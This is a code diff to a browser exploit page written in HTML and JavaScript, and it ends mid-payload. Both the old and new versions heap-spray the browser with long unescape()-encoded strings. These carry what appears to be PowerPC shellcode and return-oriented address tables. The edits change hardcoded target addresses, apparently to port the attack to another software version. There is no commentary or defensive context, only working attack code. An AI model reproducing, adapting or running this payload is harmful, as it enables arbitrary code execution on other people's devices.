@@ -1,91 +1,79 @@
-<script>
-// Alloc primitive.
-function pow2str(p, b) {
-  var str = String.fromCharCode(b);
-  for (; p; p--){
-    str += str;
-  }
-  return str;
-}
-
-function alloc(n, b) {
-  var res = '';
-  for(var i = 0; i < 32; i++){
-    if(n & 0x1)
-      res += pow2str(i, b);
-    n >>= 1;
-  }
-  //flatten
-  res[0];
-  return res;
-}
-
-function sprayInc(n) {            
-    var str = unescape("%u0102%u4dd8%u0000%u0004%u1b20%u18b4%u0104%u21ec%u1b20%u1850%u0103%ucdd4%u0000%u0018%u1b20%u1b2c%u0000%u0020%u0103%ucd8c%u0000%u0028%u1003%uaaac%u0000%u0030%u0102%u4dd8%u0d8f%u502c%u0104%u1614");
-    str    += unescape("%u1b20%u1850%u0103%ucd8c%u0000%u0048%u1003%uaab0%u0000%u0050%u0102%u4dd8%u1b20%u1b20%u0000%u005c%u0000%u0060%u0103%ucd8c%u0000%u0068%u0000%u006c%u0000%u0070%u0102%u4dd8%u0000%u0001%u0000%u007c");
-    str    += unescape("%u0000%u0080%u0104%u1174%u0000%u0088%u0000%u008c%u0000%u0090%u1b20%u1820%u0000%u0098%u0101%ucd44%u0102%u4dd8%u0000%u00a4%u0000%u0000%u0103%u70c0%u0000%u0000%u0103%ucdd4%u0000%u00b8%u1b20%u18c0");
-    str    += unescape("%u0000%u00c0%u0101%ucd44%u0000%u00c8%u1b20%u1908%u0000%u00d0%u0102%u4d8c%u0180%u0000%u1b20%u1b80%u0000%u0200%u0000%u00e4%u0101%ucd44%u1b20%u190c%u0000%u00f0%u0103%u5a6c%u0000%u0000%u1b20%u1934");
-    str    += unescape("%u0000%u0100%u0102%u4d8c%u0180%u0000%u0000%u0200%u0000%u0110%u0000%u0114%u0101%ucd44%u1b20%u193c%u0102%u3ee8%u0000%u0000%u0000%u0128%u1b20%u1964%u0000%u0130%u0102%u4d8c%u0180%u0000%u0000%u0200");
-    str    += unescape("%u0000%u0140%u0000%u0144%u0101%ucd44%u1b20%u196c%u0102%u4010%u0000%u0000%u0000%u0158%u1b20%u18c0%u0000%u0160%u0102%u4dd8%u0000%u0001%u0000%u016c%u0000%u0170%u0101%ucd44%u0000%u0178%u0000%u017c");
-    str    += unescape("%u0000%u0180%u0180%u0000%u0000%u0188%u0000%u018c%u0000%u4000%u0000%u7ffc%u0000%u0198%u0000%u019c%u0000%u01a0%u0000%u01a4%u0000%u01a8%u0000%u01ac%u0000%u01b0%u0000%u01b4%u0000%u01b8%u0000%u01bc");
-    str    += unescape("%u0000%u01c0%u0000%u01c4%u0000%u01c8%u0000%u01cc%u0000%u01d0%u0000%u01d4%u0000%u01d8%u0000%u01dc%u0000%u01e0%u0000%u01e4%u0000%u01e8%u0000%u01ec%u0000%u01f0%u0000%u01f4%u0000%u01f8%u0000%u01fc");
-    str    += unescape("%u0000%u0200%u0000%u0204%u0000%u0208%u0000%u020c%u0000%u0210%u0000%u0214%u0000%u0218%u0000%u021c%u0000%u0220%u0000%u0224%u0000%u0228%u0000%u022c%u0000%u0230%u0000%u0234%u0000%u0238%u0000%u023c");
-    str    += unescape("%u0000%u0240%u0000%u0244%u0000%u0248%u0000%u024c%u0000%u0250%u0000%u0254%u0000%u0258%u0000%u025c%u0000%u0260%u0000%u0264%u0000%u0268%u0000%u026c%u0000%u0270%u0000%u0274%u0000%u0278%u0000%u027c");
-    str    += unescape("%u0000%u0280%u0000%u0284%u0000%u0288%u0000%u028c%u0000%u0290%u0000%u0294%u0000%u0298%u0000%u029c%u0000%u02a0%u0000%u02a4%u0000%u02a8%u0000%u02ac%u0000%u02b0%u0000%u02b4%u0000%u02b8%u0000%u02bc");
+<html>
+    <head>
+        <script>
+            function sprayOne(mem, size, v) {
+                var a = new Uint32Array(size - 20);
+                for (var j = 0; j < a.length; j++) a[j] = v;
+                var t = document.createTextNode(String.fromCharCode.apply(null, new Uint32Array(a)));
+                mem.push(t);
+            }
+            function sprayInc(n) {              
+    var str = unescape("%u0000%u0000%u0000%u0004%u0000%u0008%u0dc8%u0e30%u0000%u0010%u1dd7%ub814%u0000%u0018%u0000%u0000%u0000%u0020%u0e58%ud618%u0000%u0028%u0e0f%u83c0%u0000%u0030%u0000%u0034%u0000%u0038%u0000%u003c");
+    str    += unescape("%u0000%u0040%u0000%u0044%u0000%u0048%u0000%u004c%u0000%u0050%u0000%u0054%u0000%u0058%u0000%u005c%u0000%u8000%u0000%u0064%u0000%u0068%u0000%u006c%u0000%u0070%u0000%u0074%u0000%u0078%u1dd7%ub818");
+    str    += unescape("%u0000%u0080%u0000%u0084%u0180%u0000%u0e0e%u5114%u0000%u0090%u1dd7%ub9c4%u0000%u0098%u0000%u009c%u0000%u00a0%u0000%u00a4%u0000%u00a8%u0000%u00ac%u0000%u00b0%u0000%u00b4%u0000%u00b8%u0180%u0000");
+    str    += unescape("%u0000%u00c0%u0e58%ud618%u0000%u00c8%u0dc8%u0e30%u0000%u00d0%u1dd7%ub81c%u0000%u00d8%u0180%u0000%u0000%u00e0%u0e0e%u5114%u0000%u00e8%u0000%u8000%u0000%u00f0%u0000%u00f4%u0000%u00f8%u0000%u00fc");
+    str    += unescape("%u0000%u0100%u0000%u0104%u0000%u0108%u0000%u010c%u0000%u0110%u0180%u0000%u0000%u0118%u0e58%ud618%u0000%u0120%u0dc8%u0e30%u0000%u0128%u1dd7%ub820%u0000%u0130%u0180%u0000%u0000%u0138%u0e0e%u5114");
+    str    += unescape("%u0000%u0140%u0000%u8000%u0000%u0148%u0000%u014c%u0000%u0150%u0000%u0154%u0000%u0158%u0000%u015c%u0000%u0160%u0000%u0164%u0000%u0168%u0180%u0000%u0000%u0170%u0e58%ud618%u0000%u0178%u0dc8%u0e30");
+    str    += unescape("%u0000%u0180%u1dd7%ub814%u0000%u0188%u0000%u0001%u0000%u0190%u0e58%ud618%u0000%u0198%u0180%u0000%u0000%u01a0%u0000%u01a4%u0000%u01a8%u0000%u01ac%u9421%ue000%u7c3f%u0b78%u3d20%u1dd7%u6129%ub814");
+    str    += unescape("%u913f%u0008%u3920%u0000%u913f%u000c%u4800%u0034%u813f%u0008%u8149%u0000%u3d20%ucafe%u6129%ucafe%u7f8a%u4800%u409e%u0010%u813f%u000c%u3929%u0001%u913f%u000c%u813f%u0008%u3929%u0004%u913f%u0008");
+    str    += unescape("%u813f%u000c%u2f89%u0095%u409d%uffc8%u3d20%u0103%u6129%u5460%u3d40%u1dd7%u6143%ub814%u3d40%u1dd7%u6144%uc014%u38a0%u0600%u7d29%u03a6%u4e80%u0421%u3d20%u1dd7%u6129%ub8a8%u913f%u0010%u815f%u0008");
+    str    += unescape("%u813f%u0010%u9149%u0000%u3c20%u1dd7%u6021%ub814%u3d20%u0dc8%u6129%u0440%u7d29%u03a6%u4e80%u0421%u397f%u0020%u800b%u0004%u7c08%u03a6%u83eb%ufffc%u7d61%u5b78%u4e80%u0020%u7c08%u03a6%u83eb%ufffc");
+    str    += unescape("%u7d61%u5b78%u4e80%u0020%u0000%u0288%u0000%u028c%u0000%u0290%u0000%u0294%u0000%u0298%u0000%u029c%u0000%u02a0%u0000%u02a4%u0000%u02a8%u0000%u02ac%u0000%u02b0%u0000%u02b4%u0000%u02b8%u0000%u02bc");
     str    += unescape("%u0000%u02c0%u0000%u02c4%u0000%u02c8%u0000%u02cc%u0000%u02d0%u0000%u02d4%u0000%u02d8%u0000%u02dc%u0000%u02e0%u0000%u02e4%u0000%u02e8%u0000%u02ec%u0000%u02f0%u0000%u02f4%u0000%u02f8%u0000%u02fc");
-    str    += unescape("%u0000%u0300%u0000%u0304%u0000%u0308%u0000%u0000%u1b20%u1b28%u0104%u3528%u1b20%u1814%u1b20%u1ad8%u0101%ucd50%u0000%u0324%u0000%u0328%u0000%u032c%u0000%u0330%u0000%u0334%u0000%u0338%u0000%u033c");
-    str    += unescape("%u0000%u0340%u0000%u0344%u0000%u0348%u0000%u034c%u0000%u0350%u0000%u0354%u0000%u0358%u0000%u035c%u0000%u0360%u0000%u0364%u1b20%u1b28%u9421%ue000%u7c3f%u0b78%u3d20%u1003%u6129%uaaac%u913f%u000c");
-    str    += unescape("%u813f%u000c%u3929%u0004%u3940%u0000%u9149%u0000%u8149%u0000%u813f%u000c%u9149%u0000%u3d20%u1b20%u6129%u1814%u913f%u0010%u3d20%u0103%u6129%u5a6c%u807f%u0010%u3d40%u1b20%u6144%u2814%u38a0%u05c0");
-    str    += unescape("%u7d29%u03a6%u4e80%u0421%u3d20%u1b20%u6129%u1814%u913f%u0008%u4800%u006c%u813f%u0008%u8149%u0000%u3d20%ucafe%u6129%ucafe%u7f8a%u4800%u409e%u0048%u813f%u0008%u3929%u4000%u8149%u0000%u813f%u0010");
-    str    += unescape("%u3929%u0190%u8129%u0000%u7f8a%u4840%u409e%u0028%u813f%u0008%u3929%u7ffc%u8149%u0000%u813f%u0010%u3929%u0194%u8129%u0000%u7f8a%u4840%u409e%u0008%u4800%u0024%u813f%u0008%u3929%u0004%u913f%u0008");
-    str    += unescape("%u815f%u0008%u3d20%u1fff%u6129%uffff%u7f8a%u4840%u409d%uff88%u815f%u0008%u3d20%u2000%u7f8a%u4800%u409e%u001c%u3d20%u0103%u6129%u1368%u3d40%u0180%u386a%u018c%u7d29%u03a6%u4e80%u0421%u813f%u0010");
-    str    += unescape("%u3929%u0318%u815f%u0010%u394a%u00a0%u9149%u0000%u813f%u0010%u3929%u00dc%u815f%u0008%u394a%u0004%u9149%u0000%u813f%u0010%u3929%u00e0%u3940%u0000%u614a%u8000%u9149%u0000%u3d20%u0d8f%u6129%u502c");
-    str    += unescape("%u3d40%u1b20%u6143%u1b20%u7d29%u03a6%u4e80%u0421%u397f%u0020%u800b%u0004%u7c08%u03a6%u83eb%ufffc%u7d61%u5b78%u4e80%u0020%u436f%u6465%u206e%u6f74%u2066%u6f75%u6e64%u0020%u436f%u6465%u206e%u6f74");
-    str    += unescape("%u2066%u6f75%u6e64%u0000%u0000%u0508%u0000%u050c%u0000%u0510%u0000%u0514%u0000%u0518%u0000%u051c%u0000%u0520%u0000%u0524%u0000%u0528%u0000%u052c%u0000%u0530%u0000%u0534%u0000%u0538%u0000%u053c");
-    str    += unescape("%u0000%u0540%u0000%u0544%u0000%u0548%u0000%u054c%u0000%u0550%u0000%u0554%u0000%u0558%u0000%u055c%u0000%u0560%u0000%u0564%u0000%u0568%u0000%u056c%u0000%u0570%u0000%u0574%u0000%u0578%u0000%u057c");
+    str    += unescape("%u0000%u0300%u0000%u0304%u0000%u0308%u0000%u030c%u0000%u0310%u0000%u0314%u0000%u0318%u0000%u031c%u0000%u0320%u0000%u0324%u0000%u0328%u0000%u032c%u0000%u0330%u0000%u0334%u0000%u0338%u0000%u033c");
+    str    += unescape("%u0000%u0340%u0000%u0344%u0000%u0348%u0000%u034c%u0000%u0350%u0000%u0354%u0000%u0358%u0000%u035c%u0000%u0360%u0000%u0364%u0000%u0368%u0000%u036c%u0000%u0370%u0000%u0374%u0000%u0378%u0000%u037c");
+    str    += unescape("%u0000%u0380%u0000%u0384%u0000%u0388%u0000%u038c%u0000%u0390%u0000%u0394%u0000%u0398%u0000%u039c%u0000%u03a0%u0000%u03a4%u0000%u03a8%u0000%u03ac%u0000%u03b0%u0000%u03b4%u0000%u03b8%u0000%u03bc");
+    str    += unescape("%u0000%u03c0%u0000%u03c4%u0000%u03c8%u0000%u03cc%u0000%u03d0%u0000%u03d4%u0000%u03d8%u0000%u03dc%u0000%u03e0%u0000%u03e4%u0000%u03e8%u0000%u03ec%u0000%u03f0%u0000%u03f4%u0000%u03f8%u0000%u03fc");
+    str    += unescape("%u0000%u0400%u0000%u0404%u0000%u0408%u0000%u040c%u0000%u0410%u0000%u0414%u0000%u0418%u0000%u041c%u0000%u0420%u0000%u0424%u0000%u0428%u0000%u042c%u0000%u0430%u0000%u0434%u0000%u0438%u0000%u043c");
+    str    += unescape("%u0000%u0440%u0000%u0444%u0000%u0448%u0000%u044c%u0000%u0450%u0000%u0454%u0000%u0458%u0000%u045c%u0000%u0460%u0000%u0464%u0000%u0468%u0000%u046c%u0000%u0470%u0000%u0474%u0000%u0478%u0000%u047c");
+    str    += unescape("%u0000%u0480%u0000%u0484%u0000%u0488%u0000%u048c%u0000%u0490%u0000%u0494%u0000%u0498%u0000%u049c%u0000%u04a0%u0000%u04a4%u0000%u04a8%u0000%u04ac%u0000%u04b0%u0000%u04b4%u0000%u04b8%u0000%u04bc");
+    str    += unescape("%u0000%u04c0%u0000%u04c4%u0000%u04c8%u0000%u04cc%u0000%u04d0%u0000%u04d4%u0000%u04d8%u0000%u04dc%u0000%u04e0%u0000%u04e4%u0000%u04e8%u0000%u04ec%u0000%u04f0%u0000%u04f4%u0000%u04f8%u0dc8%u0440");
+    str    += unescape("%u0dc8%u0440%u0dc8%u0440%u0dc8%u0440%u0dc8%u0440%u0000%u0510%u0000%u0514%u0000%u0518%u0000%u051c%u0000%u0520%u0000%u0524%u0000%u0528%u0000%u052c%u0000%u0530%u0000%u0534%u0000%u0538%u0103%u6724");
+    str    += unescape("%u0103%u5460%u0102%u3a00%u0102%u3b28%u0f85%ufe0c%u0000%u0550%u0000%u0554%u0000%u0558%u0000%u055c%u0000%u0560%u0000%u0564%u0000%u0568%u0000%u056c%u0000%u0570%u0000%u0574%u0000%u0578%u0000%u057c");
     str    += unescape("%u0000%u0580%u0000%u0584%u0000%u0588%u0000%u058c%u0000%u0590%u0000%u0594%u0000%u0598%u0000%u059c%u0000%u05a0%u0000%u05a4%u0000%u05a8%u0000%u05ac%u0000%u05b0%u0000%u05b4%u0000%u05b8%u0000%u05bc");
+    str    += unescape("%u0000%u05c0%u0000%u05c4%u0000%u05c8%u0000%u05cc%u0000%u05d0%u0000%u05d4%u0000%u05d8%u0000%u05dc%u0000%u05e0%u0000%u05e4%u0000%u05e8%u0000%u05ec%u0000%u05f0%u0000%u05f4%u0000%u05f8%u0000%u05fc");
 
-    var h1 = [];
-    h1[0] = str.substring(0, str.length);
-
-    for (i = 1; i <= n; i++)
-	h1[i] = unescape(h1[0]);
-
-    return h1;
-}
-
-function sprayCode(n) {              
+                var h1 = [];
+                h1[0] = str.substring(0, str.length);
+                
+                for (i = 1; i <= n; i++)
+                    h1[i] = unescape(h1[0]);
+                    
+                return h1;
+            }
+            
+            function sprayCode(n) {              
     var str = unescape("%ucafe%ucafe%u3c20%u1ab5%u6021%ud138%u4800%u178d%u7c08%u02a6%u9421%ufff0%u93c1%u0004%u93e1%u0008%u7c05%u0378%u7c26%u0b78%u3800%u3600%u4400%u0002%u6000%u0000%u7ca0%u2b78%u7cc1%u3378%u83c1%u0004");
     str    += unescape("%u83e1%u0008%u3821%u0010%u7c08%u03a6%u4e80%u0020%u7fd8%u82a6%u7ff9%u82a6%u7c00%u06ac%u4c00%u012c%u3c60%ufff0%u6063%u0002%u7c78%u83a6%u3c60%ufff0%u6063%u0032%u7c79%u83a6%u7c00%u06ac%u4c00%u012c");
-    str    += unescape("%u3c60%ufff1%u6063%ud638%u3c80%u3ce0%u6084%u3080%u9083%u0000%u3c80%u60e7%u6084%u0012%u9083%u0004%u3c80%u7cf1%u6084%u8ba6%u9083%u0008%u3c80%u3ce0%u6084%u0080%u9083%u000c%u3c80%u60e7%u6084%u00ff");
+    str    += unescape("%u3c60%ufff1%u6063%ud518%u3c80%u3ce0%u6084%u3080%u9083%u0000%u3c80%u60e7%u6084%u0012%u9083%u0004%u3c80%u7cf1%u6084%u8ba6%u9083%u0008%u3c80%u3ce0%u6084%u0080%u9083%u000c%u3c80%u60e7%u6084%u00ff");
     str    += unescape("%u9083%u0010%u3c80%u7cf0%u6084%u8ba6%u9083%u0014%u3c80%u7c00%u6084%u06ac%u9083%u0018%u3c80%u4c00%u6084%u012c%u9083%u001c%u3c80%u7ce8%u6084%u02a6%u9083%u0020%u3c80%u4880%u6084%u0003%u9083%u0024");
-    str    += unescape("%u3c60%ufff1%u6063%ud620%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud640%u7c00%u18ac%u7c00%u1fac%u7c00%u04ac%u3c60%u3080%u6063%u0012%u7c71%u8ba6%u3c60%u0080%u6063%u00ff%u7c70%u8ba6%u7c00%u06ac");
-    str    += unescape("%u4c00%u012c%u3c80%u6000%u3c60%ufff0%u6063%u6a14%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff0%u6063%u6aa0%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff0%u6063%u03c8%u9083%u0000%u7c00%u18ac");
-    str    += unescape("%u7c00%u1fac%u3c60%ufff0%u6063%u03cc%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud720%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud73c%u9083%u0000%u7c00%u18ac%u7c00%u1fac");
-    str    += unescape("%u3c60%ufff1%u6063%ud840%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u7c00%u06ac%u4c00%u012c%u3c60%uffee%u6063%u0002%u7c78%u83a6%u3c60%uffee%u6063%u0032%u7c79%u83a6%u7c00%u06ac%u4c00%u012c%u3c80%u6000");
+    str    += unescape("%u3c60%ufff1%u6063%ud500%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud520%u7c00%u18ac%u7c00%u1fac%u7c00%u04ac%u3c60%u3080%u6063%u0012%u7c71%u8ba6%u3c60%u0080%u6063%u00ff%u7c70%u8ba6%u7c00%u06ac");
+    str    += unescape("%u4c00%u012c%u3c80%u6000%u3c60%ufff0%u6063%u697c%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff0%u6063%u6a08%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff0%u6063%u03c8%u9083%u0000%u7c00%u18ac");
+    str    += unescape("%u7c00%u1fac%u3c60%ufff0%u6063%u03cc%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud600%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%ufff1%u6063%ud61c%u9083%u0000%u7c00%u18ac%u7c00%u1fac");
+    str    += unescape("%u3c60%ufff1%u6063%ud720%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u7c00%u06ac%u4c00%u012c%u3c60%uffee%u6063%u0002%u7c78%u83a6%u3c60%uffee%u6063%u0032%u7c79%u83a6%u7c00%u06ac%u4c00%u012c%u3c80%u6000");
     str    += unescape("%u3c60%uffee%u6063%u10b8%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u3c60%uffee%u6063%u10bc%u9083%u0000%u7c00%u18ac%u7c00%u1fac%u7c00%u06ac%u4c00%u012c%u7fd8%u83a6%u7ff9%u83a6%u7c00%u06ac%u4c00%u012c");
-    str    += unescape("%u4c00%u0064%u5463%u083c%u3863%u0001%u7c69%u03a6%u4240%u000c%u6000%u0000%u4bff%ufff8%u4e80%u0020%u9421%uffd0%u7c08%u02a6%u3ca0%u0180%u3880%u0000%ubfc1%u0028%u3fe0%u0102%u63ff%ub790%u9001%u0034");
+    str    += unescape("%u4c00%u0064%u5463%u083c%u3863%u0001%u7c69%u03a6%u4240%u000c%u6000%u0000%u4bff%ufff8%u4e80%u0020%u9421%uffd0%u7c08%u02a6%u3ca0%u0180%u3880%u0000%ubfc1%u0028%u3fe0%u0102%u63ff%ub3e4%u9001%u0034");
     str    += unescape("%u7fe9%u03a6%u38a5%u207c%u38c1%u001c%u7c7e%u1b78%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u38a5%u2083%u38c1%u0018%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000");
     str    += unescape("%u38a5%u2095%u38c1%u0014%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u38a5%u20a4%u38c1%u0010%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u38a5%u20b6%u38c1%u000c");
     str    += unescape("%u4e80%u0421%u3ca0%u0180%u38c1%u0008%u38a5%u20bf%u7fc3%uf378%u3880%u0000%u7fe9%u03a6%u4e80%u0421%u8121%u0008%u7d29%u03a6%u4e80%u0421%u8121%u0018%u7c7e%u1b78%u3880%u0040%u7d29%u03a6%u3860%u0100");
     str    += unescape("%u4e80%u0421%u8121%u001c%u3880%u0000%u38a0%u0100%u7d29%u03a6%u7c7f%u1b78%u4e80%u0421%u8121%u0010%u7fe4%ufb78%u38a0%u0003%u38c0%u0000%u38e0%u0000%u7d29%u03a6%u7fc3%uf378%u4e80%u0421%u8121%u000c");
     str    += unescape("%u7fc3%uf378%u7d29%u03a6%u4e80%u0421%u8121%u0014%u7fe3%ufb78%u7d29%u03a6%u4e80%u0421%u3c60%u1fff%u6063%uffff%u4bff%ufea1%u3961%u0030%u4800%u1be0%u9421%uffd8%u7c08%u02a6%u3d20%u0102%ubfa1%u001c");
-    str    += unescape("%u6129%ub790%u7cbe%u2b78%u3ca0%u0180%u9001%u002c%u7c9d%u2378%u7cdf%u3378%u7d29%u03a6%u3880%u0000%u38a5%u20c7%u38c1%u0008%u4e80%u0421%u8121%u0008%u7fa4%ueb78%u7fc5%uf378%u7d29%u03a6%u7fe6%ufb78");
-    str    += unescape("%u3860%u0000%u4e80%u0421%u8121%u0008%u3860%u0001%u7fa4%ueb78%u7fc5%uf378%u7fe6%ufb78%u7d29%u03a6%u4e80%u0421%u3961%u0028%u4800%u1b60%u9421%uffd8%u7c08%u02a6%u3d20%u0102%ubf81%u0018%u6129%ub790");
+    str    += unescape("%u6129%ub3e4%u7cbe%u2b78%u3ca0%u0180%u9001%u002c%u7c9d%u2378%u7cdf%u3378%u7d29%u03a6%u3880%u0000%u38a5%u20c7%u38c1%u0008%u4e80%u0421%u8121%u0008%u7fa4%ueb78%u7fc5%uf378%u7d29%u03a6%u7fe6%ufb78");
+    str    += unescape("%u3860%u0000%u4e80%u0421%u8121%u0008%u3860%u0001%u7fa4%ueb78%u7fc5%uf378%u7fe6%ufb78%u7d29%u03a6%u4e80%u0421%u3961%u0028%u4800%u1b60%u9421%uffd8%u7c08%u02a6%u3d20%u0102%ubf81%u0018%u6129%ub3e4");
     str    += unescape("%u7cbd%u2b78%u3ca0%u0180%u9001%u002c%u38a5%u20d9%u7d29%u03a6%u7c9e%u2378%u7cdc%u3378%u3880%u0000%u38c1%u0008%u7cff%u3b78%u579c%u402e%u57bd%u801e%u7f9f%ufb78%u57de%uc00e%u7fff%ueb78%u4e80%u0421");
     str    += unescape("%u8121%u0008%u7fff%uf378%u3860%u0000%u7d29%u03a6%u7fe4%ufb78%u4e80%u0421%u8121%u0008%u3860%u0001%u7fe4%ufb78%u7d29%u03a6%u4e80%u0421%u3961%u0028%u4800%u1ad4%u9421%uffe0%u7c08%u02a6%u3ca0%u0180");
-    str    += unescape("%u3880%u0000%ubfc1%u0018%u3fe0%u0102%u63ff%ub790%u9001%u0024%u7fe9%u03a6%u38a5%u20ef%u38c1%u0010%u7c7e%u1b78%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u7fc3%uf378%u3880%u0000%u38a5%u20fc%u38c1%u000c");
+    str    += unescape("%u3880%u0000%ubfc1%u0018%u3fe0%u0102%u63ff%ub3e4%u9001%u0024%u7fe9%u03a6%u38a5%u20ef%u38c1%u0010%u7c7e%u1b78%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u7fc3%uf378%u3880%u0000%u38a5%u20fc%u38c1%u000c");
     str    += unescape("%u4e80%u0421%u3ca0%u0180%u38a5%u2112%u38c1%u0008%u3880%u0000%u7fe9%u03a6%u7fc3%uf378%u4e80%u0421%u8121%u0008%u3860%u0000%u7d29%u03a6%u4e80%u0421%u8121%u0008%u7c7f%u1b78%u3860%u0001%u7d29%u03a6");
     str    += unescape("%u4e80%u0421%u8121%u0010%u7c64%u1b78%u3c7f%uf400%u7d29%u03a6%u4e80%u0421%u8121%u0010%u7fe4%ufb78%u3c60%uf400%u7d29%u03a6%u4e80%u0421%u8121%u000c%u3860%u0000%u7d29%u03a6%u4e80%u0421%u8121%u000c");
     str    += unescape("%u3860%u0001%u7d29%u03a6%u4e80%u0421%u3961%u0020%u4800%u19fc%u9421%uffe8%u7c08%u02a6%ubfa1%u000c%u7c9e%u2378%u7c7f%u1b78%u7fc6%uf378%u3880%u0000%u9001%u001c%u7cbd%u2b78%u4bff%ufdf9%u7fe3%ufb78");
     str    += unescape("%u4bff%ufef5%u7fe3%ufb78%u7fa5%ueb78%u7fc6%uf378%u3880%u0000%u4bff%ufddd%u8001%u001c%u7fe3%ufb78%ubba1%u000c%u7c08%u03a6%u3821%u0018%u4bff%ufec8%u9421%uffe0%u7c08%u02a6%u3ca0%u0180%u3880%u0000");
-    str    += unescape("%ubfc1%u0018%u3fc0%u0102%u63de%ub790%u9001%u0024%u7fc9%u03a6%u38a5%u212a%u38c1%u0010%u7c7f%u1b78%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u7fe3%ufb78%u3880%u0000%u38a5%u2112%u38c1%u000c%u4e80%u0421");
+    str    += unescape("%ubfc1%u0018%u3fc0%u0102%u63de%ub3e4%u9001%u0024%u7fc9%u03a6%u38a5%u212a%u38c1%u0010%u7c7f%u1b78%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u7fe3%ufb78%u3880%u0000%u38a5%u2112%u38c1%u000c%u4e80%u0421");
     str    += unescape("%u3ca0%u0180%u38a5%u2137%u38c1%u0008%u3880%u0000%u7fe3%ufb78%u7fc9%u03a6%u4e80%u0421%u8121%u0010%u7d29%u03a6%u4e80%u0421%u8121%u000c%u3860%u0000%u7d29%u03a6%u4e80%u0421%u8121%u000c%u7c7e%u1b78");
     str    += unescape("%u3860%u0001%u7d29%u03a6%u4e80%u0421%u8121%u0008%u3c80%uf400%u3860%u0000%u7d29%u03a6%u4e80%u0421%u8121%u0008%u3c9e%uf400%u3860%u0001%u7d29%u03a6%u4e80%u0421%u3880%u0000%u38a0%u0000%u38c0%u0000");
     str    += unescape("%u38e0%u0000%u7fe3%ufb78%u4bff%ufd65%u7fe3%ufb78%u4bff%ufde5%u3880%u0000%u38a0%u0000%u38c0%u0000%u38e0%u0000%u7fe3%ufb78%u4bff%ufd45%u7fe3%ufb78%u4bff%ufdc5%u3c80%u0180%u7fe3%ufb78%u3884%u214b");
-    str    += unescape("%u38a0%u0000%u4bff%ufe91%u3961%u0020%u4800%u1880%u7c08%u02a6%u9421%uffe0%u3d20%u0102%u3ca0%u0180%u6129%ub790%u93e1%u001c%u7d29%u03a6%u9001%u0024%u3880%u0000%u38a5%u2163%u38c1%u0008%u7c7f%u1b78");
+    str    += unescape("%u38a0%u0000%u4bff%ufe91%u3961%u0020%u4800%u1880%u7c08%u02a6%u9421%uffe0%u3d20%u0102%u3ca0%u0180%u6129%ub3e4%u93e1%u001c%u7d29%u03a6%u9001%u0024%u3880%u0000%u38a5%u2163%u38c1%u0008%u7c7f%u1b78");
     str    += unescape("%u4e80%u0421%u3880%u0000%u38a0%u0000%u38c0%u0000%u38e0%u0000%u7fe3%ufb78%u4bff%ufcd5%u7fe3%ufb78%u4bff%ufd55%u3880%u0000%u38a0%u0000%u38c0%u0000%u38e0%u0000%u7fe3%ufb78%u4bff%ufcb5%u7fe3%ufb78");
-    str    += unescape("%u4bff%ufd35%u8121%u0008%u7d29%u03a6%u4e80%u0421%u3961%u0020%u4800%u17fc%u9421%uffd8%u7c08%u02a6%u3ca0%u0180%ubfa1%u001c%u3fe0%u0102%u63ff%ub790%u9001%u002c%u7fe9%u03a6%u7c9d%u2378%u38a5%u2083");
+    str    += unescape("%u4bff%ufd35%u8121%u0008%u7d29%u03a6%u4e80%u0421%u3961%u0020%u4800%u17fc%u9421%uffd8%u7c08%u02a6%u3ca0%u0180%ubfa1%u001c%u3fe0%u0102%u63ff%ub3e4%u9001%u002c%u7fe9%u03a6%u7c9d%u2378%u38a5%u2083");
     str    += unescape("%u3880%u0000%u38c1%u0014%u7c7e%u1b78%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u38a5%u2169%u38c1%u0010%u4e80%u0421%u3ca0%u0180%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u38a5%u2178");
     str    += unescape("%u38c1%u000c%u4e80%u0421%u3ca0%u0180%u38a5%u2187%u38c1%u0008%u7fc3%uf378%u7fe9%u03a6%u3880%u0000%u4e80%u0421%u8121%u0014%u3880%u0020%u3860%u0300%u7d29%u03a6%u4e80%u0421%u8121%u0014%u7c7e%u1b78");
     str    += unescape("%u3880%u0008%u7d29%u03a6%u3860%u1000%u4e80%u0421%u8161%u0010%u3920%u0000%u7fa4%ueb78%u7d69%u03a6%u38a0%u0000%u38c0%u0000%u38fe%u0300%u3900%u0300%u3940%u001a%u7c7f%u1b78%u4e80%u0421%u8121%u000c");
@@ -93,11 +81,11 @@ function sprayCode(n) {
     str    += unescape("%u6000%u0000%u4bff%uffc8%u3961%u0028%u4800%u16bc%u38a5%u0001%u3920%u0000%u7ca9%u03a6%u4240%u001c%u7d03%u48ae%u7d44%u48ae%u7f88%u5000%u409e%u0014%u3929%u0001%u4bff%uffe8%u3860%u0000%u4e80%u0020");
     str    += unescape("%u3860%u0001%u4e80%u0020%u38a5%u0001%u3920%u0000%u7ca9%u03a6%u4240%u0014%u7d44%u48ae%u7d43%u49ae%u3929%u0001%u4bff%ufff0%u4e80%u0020%u7c08%u02a6%u9421%uffe8%ubf81%u0008%u7c7e%u1b78%u9001%u001c");
